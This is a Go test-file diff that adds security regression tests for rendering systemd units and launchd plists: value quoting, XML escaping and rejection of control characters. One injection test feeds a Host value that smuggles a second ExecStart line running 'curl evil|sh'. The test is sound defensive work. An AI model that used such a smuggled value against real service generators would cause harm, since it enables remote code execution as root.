@@ -36,13 +36,13 @@ func TestRenderSystemdUnit_Golden(t *testing.T) {
 		"",
 		"[Service]",
 		"Type=simple",
-		"ExecStart=/home/alice/.local/bin/runwisp daemon --config /home/alice/.config/runwisp/runwisp.toml --data /home/alice/.local/share/runwisp --port 9477 --host 127.0.0.1",
+		`ExecStart="/home/alice/.local/bin/runwisp" daemon --config "/home/alice/.config/runwisp/runwisp.toml" --data "/home/alice/.local/share/runwisp" --port 9477 --host "127.0.0.1"`,
 		"Restart=on-failure",
 		"RestartSec=5s",
 		"KillMode=mixed",
 		"TimeoutStopSec=30s",
-		"Environment=HOME=/home/alice",
-		"Environment=PATH=/usr/local/bin:/usr/bin:/bin",
+		`Environment="HOME=/home/alice"`,
+		`Environment="PATH=/usr/local/bin:/usr/bin:/bin"`,
 		"Environment=LANG=C.UTF-8",
 		"Environment=RUNWISP_SERVICE_MANAGED=1",
 		"",
@@ -51,6 +51,57 @@ func TestRenderSystemdUnit_Golden(t *testing.T) {
 		"",
 	}, "\n")
 	assert.Equal(t, want, string(body))
+}
+
+// TestRenderSystemdUnit_RejectsInjection guards the root-RCE primitive: a
+// newline in an interpolated value must not be allowed to inject additional
+// [Service] directives (e.g. a replacement ExecStart).
+func TestRenderSystemdUnit_RejectsInjection(t *testing.T) {
+	_, err := RenderSystemdUnit(SystemdParams{
+		Binary:  "/usr/bin/runwisp",
+		Config:  "/etc/runwisp/runwisp.toml",
+		DataDir: "/var/lib/runwisp",
+		Host:    "127.0.0.1\nExecStart=/bin/sh -c 'curl evil|sh'",
+		Port:    9477,
+		Home:    "/root",
+		Path:    "/usr/bin",
+	})
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "control character")
+}
+
+// TestRenderSystemdUnit_QuotesSpaces confirms a path with spaces is quoted so
+// systemd sees one argument rather than splitting on whitespace.
+func TestRenderSystemdUnit_QuotesSpaces(t *testing.T) {
+	body, err := RenderSystemdUnit(SystemdParams{
+		Binary:  "/opt/my apps/runwisp",
+		Config:  "/etc/runwisp/runwisp.toml",
+		DataDir: "/var/lib/runwisp",
+		Host:    "127.0.0.1",
+		Port:    9477,
+		Home:    "/root",
+		Path:    "/usr/bin",
+	})
+	require.NoError(t, err)
+	assert.Contains(t, string(body), `ExecStart="/opt/my apps/runwisp" daemon`)
+}
+
+// TestRenderLaunchdPlist_EscapesXML confirms a value with an XML metacharacter
+// is escaped rather than breaking out of its <string> element.
+func TestRenderLaunchdPlist_EscapesXML(t *testing.T) {
+	body, err := RenderLaunchdPlist(LaunchdParams{
+		Binary:  "/opt/a&b/runwisp",
+		Config:  "/etc/runwisp/runwisp.toml",
+		DataDir: "/var/lib/runwisp",
+		Host:    "127.0.0.1",
+		Port:    9477,
+		Home:    "/root",
+		Path:    "/usr/bin",
+		LogPath: "/var/log/runwisp.log",
+		Label:   "com.runwisp.daemon.x",
+	})
+	require.NoError(t, err)
+	assert.Contains(t, string(body), "<string>/opt/a&amp;b/runwisp</string>")
 }
 
 func TestRenderSystemdUnit_SystemWide_Golden(t *testing.T) {
